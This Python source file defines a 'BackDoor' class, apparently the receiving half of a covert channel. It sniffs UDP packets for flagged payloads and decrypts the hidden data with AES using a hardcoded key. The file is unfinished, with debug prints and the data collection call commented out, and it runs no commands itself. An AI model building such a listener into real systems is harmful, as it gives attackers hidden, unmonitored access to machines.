from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.layers.inet import UDP, IP, IPOption
from scapy.all import sniff, send
import sys




class BackDoor:
    def __init__(self):
        print("Backdoor has been initiated")
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag_begin = "****["
        self.flag_close = "]****"
        self.port = 53
        self.hex_data = ""

    def start(self):
        print("Starting")
        self.sniff_init()


    def sniff_init(self):
        try:
            sniff(filter="udp", prn=lambda p: self.filter_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def process_packets(self, data):
        if data == 124:
            self.decrypt_data()
            return
            # Convert ascii to character
        hex_byte = self.get_char(data)
        print(f"Received: {hex_byte}")
        # Add to hex string
        self.hex_data += hex_byte

    def get_ascii(self, hex_char) -> int:
        """Returns ascii code of char"""
        return ord(hex_char)

    def get_char(self, ascii) -> chr:
        """Gets char from ascii code"""
        return chr(ascii)
    def filter_packets(self, packet):
        print("1")
        try:
            if UDP in packet and packet[UDP].load.decode().startswith(self.flag_begin) \
                    and packet[UDP].load.decode().endswith(self.flag_close):
                print(2)
                print(f"{packet[UDP].load.decode()} <- payload")
                #self.process_packets(packet[UDP].sport)
        except:
            return

    def decrypt_data(self):
        encrypted_string = bytes.fromhex(self.hex_data)
        self.set_hex()
        print(f"Combined byte stream of encrypted message: {encrypted_string}")
        cipher = self.generate_cipher()
        # Initialize a decryptor object
        decryptor = cipher.decryptor()
        # Initialize an unpadder object
        unpadder = padding.PKCS7(128).unpadder()
        # Decrypt and remove padding
        padded_message = decryptor.update(encrypted_string) + decryptor.finalize()
        msg = unpadder.update(padded_message) + unpadder.finalize()
        msg = msg.decode()
        print(f"Decrypted message: {msg}\n")

    def set_hex(self):
        self.hex_data = ""

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
